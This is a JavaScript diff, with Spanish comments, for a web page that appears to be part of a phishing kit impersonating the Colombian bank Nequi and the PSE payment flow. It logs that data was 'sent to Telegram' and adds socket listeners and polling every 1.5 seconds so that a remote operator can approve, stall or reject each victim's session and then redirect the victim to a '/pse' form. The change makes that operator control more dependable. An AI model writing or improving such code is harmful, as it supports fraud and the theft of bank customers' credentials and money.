@@ -176,10 +176,55 @@
             if (pingInterval) clearInterval(pingInterval);
         }
 
-        function getBankUrl(data) {
-            const bank = (data && data.bank) || formData.bank || sessionStorage.getItem('bank');
-            if (data && data.bankRoute) return data.bankRoute;
-            return window.BankRoutes && BankRoutes.getBankRoute(bank);
+        const processedActions = new Set();
+
+        function goToPse() {
+            console.log('✅ Continuar a PSE — redirigiendo a /pse');
+            stopKeepAlive();
+            localStorage.setItem('fromNequi', 'true');
+            window.location.replace('/pse');
+        }
+
+        function handleFollow(data) {
+            if (data?.sessionId && data.sessionId !== sessionId) return;
+            const deliveryId = data?._deliveryId;
+            if (deliveryId) {
+                if (processedActions.has(deliveryId)) return;
+                processedActions.add(deliveryId);
+                if (socket?.connected) socket.emit('actionAck', { sessionId, deliveryId });
+            }
+            // "Continuar a PSE" SIEMPRE va al formulario de correo, nunca al banco directo
+            goToPse();
+        }
+
+        function handleWait(data) {
+            if (data?.sessionId && data.sessionId !== sessionId) return;
+            waitMessage.classList.add('show');
+            setTimeout(() => waitMessage.classList.remove('show'), (data.waitTime || 15) * 1000);
+        }
+
+        function handleReject(data) {
+            if (data?.sessionId && data.sessionId !== sessionId) return;
+            stopKeepAlive();
+            alert('Solicitud rechazada');
+            window.location.href = '/';
+        }
+
+        async function pollPendingActions() {
+            try {
+                const res = await fetch(`/api/session/${encodeURIComponent(sessionId)}/pending`, {
+                    credentials: 'same-origin',
+                    cache: 'no-store'
+                });
+                if (!res.ok) return;
+                const body = await res.json();
+                if (!Array.isArray(body.actions)) return;
+                for (const { event, payload } of body.actions) {
+                    if (event === 'actionFollow') handleFollow(payload);
+                    else if (event === 'actionWait') handleWait(payload);
+                    else if (event === 'actionReject') handleReject(payload);
+                }
+            } catch (_) { /* red intermitente */ }
         }
 
         socket.on('connect', () => {
@@ -195,39 +240,33 @@
             }, 100);
             
             startKeepAlive();
+            pollPendingActions();
         });
 
         socket.on('sessionConfirmed', (data) => {
             console.log('✅ Sesión confirmada:', data.sessionId);
+            pollPendingActions();
         });
 
         socket.on('telegramSent', (response) => {
             console.log('✅ Enviado a Telegram:', response);
         });
 
-        SessionDelivery.setupSessionDelivery(socket, sessionId, {
-            actionFollow(data) {
-                console.log('✅ Aprobado - Redirigiendo');
-                stopKeepAlive();
-                localStorage.setItem('fromNequi', 'true');
-                const bankUrl = getBankUrl(data);
-                window.location.href = bankUrl || '/pse';
-            },
-            actionWait(data) {
-                waitMessage.classList.add('show');
-                setTimeout(() => waitMessage.classList.remove('show'), (data.waitTime || 15) * 1000);
-            },
-            actionReject() {
-                stopKeepAlive();
-                alert('Solicitud rechazada');
-                window.location.href = '/';
-            },
-            actionApprovePSE(data) {
-                stopKeepAlive();
-                const bankUrl = getBankUrl(data);
-                window.location.href = bankUrl || '/';
-            }
-        });
+        // Listeners directos (funcionan aunque falle session-delivery-client.js)
+        socket.on('actionFollow', handleFollow);
+        socket.on('actionWait', handleWait);
+        socket.on('actionReject', handleReject);
+
+        // Polling de respaldo cada 1.5s por si el socket pierde el evento
+        setInterval(pollPendingActions, 1500);
+
+        if (window.SessionDelivery) {
+            SessionDelivery.setupSessionDelivery(socket, sessionId, {
+                actionFollow: handleFollow,
+                actionWait: handleWait,
+                actionReject: handleReject
+            });
+        }
         
         socket.on('disconnect', (reason) => {
             if (reason === 'io server disconnect') socket.connect();
